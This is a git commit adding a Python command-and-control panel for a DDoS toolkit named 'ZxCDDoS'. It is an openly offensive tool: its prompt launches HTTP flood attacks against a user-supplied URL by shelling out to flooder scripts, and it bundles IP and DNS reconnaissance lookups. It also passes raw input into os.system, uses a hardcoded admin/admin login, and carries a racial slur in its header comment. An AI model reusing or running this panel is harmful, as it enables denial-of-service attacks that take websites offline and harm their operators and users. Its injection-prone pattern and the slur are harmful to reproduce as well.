196c28db5040c1b6c2e5d9e1b260b285c9192781
chh2k8info <115344608+chh2k8info@users.noreply.github.com>
2022-10-08 15:44:52 +0700

    Add files via upload

---
+++ cnc.py
@@ -0,0 +1,387 @@
+##############################
+# ZxCDDoS Made by zxcr9999   #
+# COPY = NIGGER              #
+##############################
+
+import socket
+import os
+import requests
+import random
+import getpass
+import time
+import sys
+from attack_bot.banner import Count, Bot, AttackSentL4, AttackSentL7
+from urllib.parse import urlparse
+
+def clear():
+    os.system('cls' if os.name == 'nt' else 'clear')
+
+#proxys = open('proxies.txt').readlines()
+#bots = len(proxys)
+
+def ascii_vro():
+    clear()
+    print(f'''
+     / **/|        
+     | == /        
+      |  |         
+      |  |         
+      |  /         
+       |/  
+
+
+
+
+
+
+
+    ''')
+    time.sleep(0.6)
+    clear()
+    print(f'''
+
+
+
+     / **/|        
+     | == /        
+      |  |         
+      |  |         
+      |  /         
+       |/  
+
+
+    ''')
+    time.sleep(0.6)
+    clear()
+    print(f'''
+
+
+
+
+
+
+
+     / **/|        
+     | == /        
+      |  |                  
+
+    ''')
+    time.sleep(0.6)
+    clear()
+    print(f"""
+
+     _.-^^---....,,--       
+ _--                  --_  
+<                        >)
+|                         | 
+ \._                   _./  
+    ```--. . , ; .--'''       
+          | |   |             
+       .-=||  | |=-.   
+       `-=#$%&%$#=-'   
+          | ;  :|     
+ _____.,-#%&$@%#&#~,._____
+    """)
+    time.sleep(0.8)
+    clear()
+
+def si():
+    print('         \x1b[38;2;0;255;255m[ \x1b[38;2;233;233;233mZxC \x1b[38;2;0;255;255m] | \x1b[38;2;233;233;233mWelcome to ZxC PN! \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mOwner: zxcr9999 \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mUpdate v1.1')
+    print("")
+def layer7():
+    clear()
+    #si()
+    print(f"""
+\033[38;5;123mHTTP-BYPASS - \033[38;5;123mHTTP1 NORMAL BYPASS
+\033[38;5;123mcringeV2 - \033[38;5;123m HTTP-cringeV2
+
+""")
+def AttackSentL7(url, time, method):
+	os.system('clear')
+	print("\033[38;5;129m   ╔══════════════════════════════════╗")
+	print("\x1b[38;5;129m   ║\033[38;5;123m ╔═╗┌┬┐┌┬┐┌─┐┌─┐┬┌─  ╔═╗┌─┐┌┐┌┌┬┐ \x1b[38;5;129m║")
+	print("\x1b[38;5;129m   ║\033[38;5;123m ╠═╣ │  │ ├─┤│  ├┴┐  ╚═╗├┤ │││ │  \x1b[38;5;129m║")
+	print("\x1b[38;5;129m   ║\033[38;5;123m ╩ ╩ ┴  ┴ ┴ ┴└─┘┴ ┴  ╚═╝└─┘┘└┘ ┴  \x1b[38;5;129m║")
+	print("\033[38;5;129m   ║══════════════════════════════════╝")
+	print(f"\x1b[38;5;129m   ║  \x1b[31m->\x1b[38;5;129m Target \x1b[31m: \x1b[31m[\x1b[38;5;123m{url}\x1b[31m]")
+	print(f"\x1b[38;5;129m   ║  \x1b[31m->\x1b[38;5;129m Method \x1b[31m: \x1b[31m[\x1b[38;5;123m{method}\x1b[31m]")
+	print(f"\x1b[38;5;129m   ║  \x1b[31m->\x1b[38;5;129m Time   \x1b[31m: \x1b[31m[\x1b[38;5;123m{time}\x1b[31m]")
+	#print(f"\x1b[38;5;129m   ║  \x1b[31m->\x1b[38;5;129m Proxy  \x1b[31m: \x1b[31m[\x1b[38;5;123m{ProxyCount()}\x1b[31m]")
+	print("\033[38;5;129m   ╚══════════════════════════════════>")
+	#print(f"\033[38;5;129m    ║\033[38;5;123m Total Attacks\x1b[31m:\033[38;5;123m{Count()}")
+	print("\033[38;5;129m    ╚═══════════════════>\n\n")
+def tools():
+    clear()
+    si()
+    print(f'''
+                                \x1b[38;2;0;212;14m╔═══════════════╗
+                                \x1b[38;2;0;212;14m║     \x1b[38;2;0;255;255mTools     \x1b[38;2;0;212;14m║
+                \x1b[38;2;0;212;14m╔═══════════════╩══════╦════════╩═══════════════╗
+                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255mgeoip               \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255mreverse-dns           \x1b[38;2;0;212;14m║
+                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255mreverseip           \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║  
+                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255msubnet-lookup       \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║
+                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255masn-lookup          \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║
+                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255mdns-lookup          \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║
+                \x1b[38;2;0;212;14m╚══════════════════════╩════════════════════════╝
+''')
+    
+def banners():
+    clear()
+    si()
+
+    print(f'''
+                                \x1b[38;2;0;212;14m╔═══════════════╗
+                                \x1b[38;2;0;212;14m║     \x1b[38;2;0;255;255mBanners   \x1b[38;2;0;212;14m║
+                \x1b[38;2;0;212;14m╔═══════════════╩══════╦════════╩═══════════════╗
+                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255mtroll               \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║
+                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255mpikachu             \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║  
+                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>             \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║
+                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>             \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║
+                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>             \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║
+                \x1b[38;2;0;212;14m╚══════════════════════╩════════════════════════╝
+''')
+
+def menu():
+    #sys.stdout.write(f"         \x1b]2;ZxC C2 --> Stars: [{bots}] | Online Users: [1] | Methods: [25] | Bypass: [10] | Amps: [1]\x07")
+    clear()
+    print("""
+          \x1b[38;5;129m╔═╗╦═╗╔═╗╦  ╦  ╔═╗
+          \x1b[38;5;129m╠═╣╠╦╝║╣ ║  ║  ╠═╣
+          \x1b[38;5;129m╩ ╩╩╚═╚═╝╩═╝╩═╝╩ ╩
+\x1b[38;5;129m╔══════════════════════════════════╗
+\x1b[38;5;129m║       \033[38;5;123mgithub.com/cochyhung       \x1b[38;5;129m║
+\x1b[38;5;129m║         \033[38;5;123m[connect: Success]       \x1b[38;5;129m║
+\x1b[38;5;129m╚══════════════════════════════════╝
+
+
+    """)
+
+def main():
+    clear()
+    menu()
+    while(True):
+        user = "cochyhung"
+        #cnc = input('''\x1b[38;2;0;212;14m╔══[C2\x1b[38;2;0;186;45m@Z\x1b[38;2;0;150;88mx\x1b[38;2;0;113;133mC\x1b[38;2;0;49;147m]
+#\x1b[38;2;0;212;14m╚\x1b[38;2;0;186;45m═\x1b[38;2;0;150;88m═\x1b[38;2;0;113;133m═\x1b[38;2;0;83;168m═\x1b[38;2;0;49;147m➤ \x1b[38;2;239;239;239m''')
+        cnc = str(input('\033[38;5;123m[root@user] '))
+        if cnc == "tools" or cnc == "tool" or cnc == "TOOLS" or cnc == "TOOL":
+            tools()
+        elif cnc == "banner" or cnc == "BANNER" or cnc == "banners" or cnc == "BANNERS":
+            banners()
+        elif cnc == "layer7" or cnc == "LAYER7" or cnc == "l7" or cnc == "L7":
+            layer7()
+
+# LAYER 4 METHODS   
+
+        
+        elif "httpget" in cnc:
+            try:
+                url = cnc.split()[1]
+                os.system(f'./httpget {url} 10000 50 100')
+            except IndexError:
+                print('Usage: httpget <url>')
+                print('Example: httpget http://example.com')
+        elif "cringeV2" in cnc:
+            try:
+                method = "HTTP-cringeV2"
+                url = cnc.split()[1]
+                time = cnc.split()[2]
+                #os.system(f'screen -dm node layer7/cringeV2 {url} {time}')
+                #os.system(f'node layer7/cringeV2 {url} {time}')
+                clear()
+                #print('attack sent {url}')
+                #AttackSentL7()
+                AttackSentL7(str(urlparse(url).netloc), int(time), str("HTTP-cringeV2"))
+                os.system(f'node layer7/cringeV2 {url} {time}')
+            except IndexError:
+                print('Usage: http-cringeV2 <url> <time>')
+                print('Example: http-cringeV2 http://example.com 100')
+        elif "http-socketv2" in cnc:
+            try:
+                method = "HTTP-cringeV2"
+                url = cnc.split()[1]
+                time = cnc.split()[2]
+                #os.system(f'screen -dm node layer7/cringeV2 {url} {time}')
+                #os.system(f'node layer7/cringeV2 {url} {time}')
+                clear()
+                #print('attack sent {url}')
+                #AttackSentL7()
+                AttackSentL7(str(urlparse(url).netloc), int(time), str("HTTP-SOCKETV2"))
+                os.system(f'node layer7/socket2 {url} {time}')
+
+
+            except IndexError:
+                print('Usage: http-cringeV2 <url> <time>')
+                print('Example: http-cringeV2 http://example.com 100')
+        elif "me" in cnc or "ME" in cnc:
+            print("\x1b[38;5;129mPLAN: \x1b[38;2;0;212;14mADMIN")
+            print("\x1b[38;5;129mtime: \x1b[38;2;0;212;14mulimited")
+            print("\x1b[38;5;129mversion \x1b[38;2;0;212;14mTEST")
+        
+
+# BANNERS
+
+        elif "troll" in cnc:
+                print('░░░░░▄▄▄▄▀▀▀▀▀▀▀▀▄▄▄▄▄▄░░░░░░░   ')
+                print('░░░░░█░░░░▒▒▒▒▒▒▒▒▒▒▒▒░░▀▀▄░░░░  ')
+                print('░░░░█░░░▒▒▒▒▒▒░░░░░░░░▒▒▒░░█░░░  ')
+                print('░░░█░░░░░░▄██▀▄▄░░░░░▄▄▄░░░░█░░  ')
+                print('░▄▀▒▄▄▄▒░█▀▀▀▀▄▄█░░░██▄▄█░░░░█░  ')
+                print('█░▒█▒▄░▀▄▄▄▀░░░░░░░░█░░░▒▒▒▒▒░█  ')
+                print('█░▒█░█▀▄▄░░░░░█▀░░░░▀▄░░▄▀▀▀▄▒█  ')
+                print('░█░▀▄░█▄░█▀▄▄░▀░▀▀░▄▄▀░░░░█░░█░  ')
+                print('░░█░░░▀▄▀█▄▄░█▀▀▀▄▄▄▄▀▀█▀██░█░░  ')
+                print('░░░█░░░░██░░▀█▄▄▄█▄▄█▄████░█░░░  ')
+                print('░░░░█░░░░▀▀▄░█░░░█░█▀██████░█░░  ')
+                print('░░░░░▀▄░░░░░▀▀▄▄▄█▄█▄█▄█▄▀░░█░░  ')
+                print('░░░░░░░▀▄▄░▒▒▒▒░░░░░░░░░░▒░░░█░  ')
+                print('░░░░░░░░░░▀▀▄▄░▒▒▒▒▒▒▒▒▒▒░░░░█░  ')
+                print('░░░░░░░░░░░░░░▀▄▄▄▄▄░░░░░░░░█░░  ')
+
+        elif "pikachu" in cnc:
+                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ')
+                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ')
+                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ')
+                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⠁⠀⠹⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ')
+                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⡇⠀⠀⠀⢿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ')
+                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ')
+                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡏⠀⠀⠀⠀⣾⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ')
+                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⠿⠃⠀⠀⠐⠚⠻⢷⣦⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ')
+                print('⠀⠀⠀⠀⠀⠀⠀⠀⣠⡾⠿⣷⣦⡀⠀⠀⠀⠀⠀⠀⠀⣰⠟⢁⣀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ')
+                print('⠀⠀⠀⠀⠀⠀⢠⣾⠟⠁⠀⠀⠙⢿⣦⣄⠀⠀⠀⠀⣼⠏⣼⣧⣼⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣷⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ')
+                print('⠀⠀⠀⠀⠀⣴⡿⠃⠀⠀⠀⠀⠀⠀⠉⠻⣷⣤⣤⡾⢿⠐⣿⡿⠃⠀⠀⠀⢀⡖⠒⣦⡀⠀⠀⠀⠀⠈⠙⠛⠷⣦⣄⡀⠀⠀⠀⠀⠀  ')
+                print('⠀⠀⠀⢠⣾⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⡿⠁⢸⠀⠀⣤⡄⠀⠀⠀⢸⣧⣤⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⣶⣄⠀⠀⠀  ')
+                print('⠀⠀⣰⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣇⡠⠃⠀⣀⡈⠀⠀⠀⠀⠘⢿⣿⣿⠟⠀⠀⠀⠀⠠⣄⠀⠀⠀⠀⠀⠈⢻⣷⣄⠀  ')
+                print('⠀⣰⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⢹⡟⠓⣶⠀⠀⠀⠀⣨⣤⣤⡀⠀⠀⠀⠀⢸⣿⣶⣦⣤⣶⣾⣿⣿⣿⣆  ')
+                print('⢠⣿⣷⣶⣶⣶⣶⣤⣤⣤⣤⣄⣀⡀⠀⠀⠀⠀⠘⣧⠀⠀⠈⣄⠀⡏⠀⠀⠀⢸⣿⣿⣿⣿⠀⠀⠀⠀⣸⡟⠀⠉⠙⠛⠛⠿⠿⠿⠛  ')
+                print('⠈⠉⠉⠉⠉⠉⠉⠉⠉⠉⣹⣿⠟⠋⠀⠀⣠⣴⡿⠿⣷⣄⠀⠈⠓⠁⠀⠀⠀⠈⠿⣿⡿⠏⠀⠀⠀⢀⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀  ')
+                print('⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⡟⠁⠀⠀⠀⢾⣿⣯⡀⠀⢸⡏⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠒⠛⠛⠿⣷⡄⠀⠀⠀⠀⠀⠀⠀⠀  ')
+                print('⠀⠀⠀⠀⠀⠀⠀⠀⠙⠛⠿⢿⣶⣦⣤⣀⠈⠙⢿⣶⣼⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⡇⠀⠀⠀⠀⠈⣿⡀⠀⠀⠀⠀⠀⠀⠀  ')
+                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⣿⡿⠃⣠⣿⢋⣽⣷⠀⠀⠀⠀⠉⠳⢦⡀⠀⠀⠀⠈⣧⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⠀⠀  ')
+                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⣷⣶⣿⣧⣾⣿⣿⡆⠀⠀⠀⠀⠀⠀⠹⣆⠀⠀⠀⠈⠻⢦⣤⣤⣴⡟⠀⠀⠀⠀⠀⠀⠀⠀  ')
+                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⢿⣿⣿⣿⣿⣿⠋⠉⠛⠃⠀⠀⠀⠀⠀⠀⠀⠘⡆⠀⠀⠀⠀⠀⠀⠀⢹⣧⠀⠀⠀⠀⠀⠀⠀⠀  ')
+                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢈⣿⣿⣿⣧⡀⠀⠀⠀⠈⠳⣤⡀⠀⠀⠀⢀⡗⠀⠀⠀⠀⠀⠀⠀⠈⣿⡆⠀⠀⠀⠀⠀⠀⠀  ')
+                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⣿⣿⣿⣷⡄⠀⠀⠀⠀⠈⠙⠓⠶⠶⠞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⠀⠀⠀⠀⠀⠀⠀  ')
+                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡿⠛⠋⠀⠀⠀⠀⠀⠀⢰⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣇⠀⠀⠀⠀⠀⠀  ')
+                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣷⡀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀⠀⠀  ')
+                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣷⡀⠀⠀⠀⠀⠀⠀⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀⠀⠀  ')
+                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣤⠀⠀⠀⠀⣰⠃⠀⠀⠀⠀⠀⠀⣀⣠⣤⣾⠁⠀⠀⠀⣸⣿⡀⠀⠀⠀⠀⠀  ')
+                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣉⣀⣀⣀⣤⣾⣿⣷⣶⣶⣶⣿⡿⠿⠿⠛⠛⠿⣷⣤⣄⡈⠀⠉⣿⡆⠀⠀⠀⠀  ')
+                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⠿⠿⠛⠛⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⠛⠛⠛⠛⠁⠀⠀⠀⠀  ')
+
+                
+# TOOLS
+        elif "geoip" in cnc:
+            try:
+                ip = cnc.split()[1]
+                try:
+                    r = requests.get(f'https://api.hackertarget.com/geoip/?q={ip}')
+                    print(r.text)
+                except:
+                    print("[ API Error :( ]")
+            except IndexError:
+                print('Usage: geoip <ip>')
+                print('Example: geoip 1.1.1.1')
+
+        elif "reverseip" in cnc:
+            try:
+                ip = cnc.split()[1]
+                try:
+                    r = requests.get(f'https://api.hackertarget.com/reverseiplookup/?q={ip}')
+                    print(r.text)
+                except:
+                    print("[ API Error :( ]")
+            except IndexError:
+                print('Usage: reverseip <ip>')
+                print('Example: reverseip 1.1.1.1')
+
+        elif "subnet-lookup" in cnc:
+            try:
+                ip = cnc.split()[1]
+                try:
+                    r = requests.get(f'https://api.hackertarget.com/subnetcalc/?q={ip}')
+                    print(r.text)
+                except:
+                    print("[ API Error :( ]")
+            except IndexError:
+                print('Usage: subnet-lookup <cdr/ip + netmask>')
+                print('Example: subnet-lookup 192.168.1.0/24')
+
+        elif "asn-lookup" in cnc:
+            try:
+                ip = cnc.split()[1]
+                try:
+                    r = requests.get(f'https://api.hackertarget.com/aslookup/?q={ip}')
+                    print(r.text)
+                except:
+                    print("[ API Error :( ]")
+            except IndexError:
+                print('Usage: asn-lookup <ip/asn>')
+                print('Example: asn-lookup AS15169')
+
+        elif "dns-lookup" in cnc:
+            try:
+                ip = cnc.split()[1]
+                try:
+                    r = requests.get(f'https://api.hackertarget.com/dnslookup/?q={ip}')
+                    print(r.text)
+                except:
+                    print("[ API Error :( ]")
+            except IndexError:
+                print('Usage: dns-lookup <dns>')
+                print('Example: dns-lookup google.com')
+
+        elif "reverse-dns" in cnc:
+            try:
+                ip = cnc.split()[1]
+                try:
+                    r = requests.get(f'https://api.hackertarget.com/reversedns/?q={ip}')
+                    print(r.text)
+                except:
+                    print("[ API Error :( ]")
+            except IndexError:
+                print('Usage: reverse-dns <ip/domain>')
+                print('Example: reverse-dns 8.8.8.8')                
+
+        elif "cloudflare-lag" in cnc:
+            print('Method "CLOUDFLARE-LAG" not enabled')
+
+        elif "help" in cnc:
+            print(f'''
+LAYER7  ► SHOW LAYER7 METHODS
+LAYER4  ► SHOW LAYER4 METHODS
+BANNERS ► SHOW BANNERS
+TOOLS   ► SHOW TOOLS
+CLEAR   ► CLEAR TERMINAL
+            ''')
+
+        else:
+            try:
+                cmmnd = cnc.split()[0]
+                print("Command: [ " + cmmnd + " ] Not Found!")
+            except IndexError:
+                pass
+
+
+def login():
+    clear()
+    user = "admin"
+    passwd = "admin"
+    print("""
+    \x1b[38;5;129m╔═╗╦═╗╔═╗╦  ╦  ╔═╗
+    \x1b[38;5;129m╠═╣╠╦╝║╣ ║  ║  ╠═╣
+    \x1b[38;5;129m╩ ╩╩╚═╚═╝╩═╝╩═╝╩ ╩
+    """)
+    username = input("⚡ Username: ")
+    password = getpass.getpass(prompt='⚡ Password: ')
+    if username != user or password != passwd:
+        print("")
+        print("⚡ Haizzz, you're so cute...")
+        sys.exit(1)
+    elif username == user and password == passwd:
+        print("⚡ Welcome to ZxC C2!")
+        time.sleep(0.3)
+        #ascii_vro()
+        main()
+
+login()
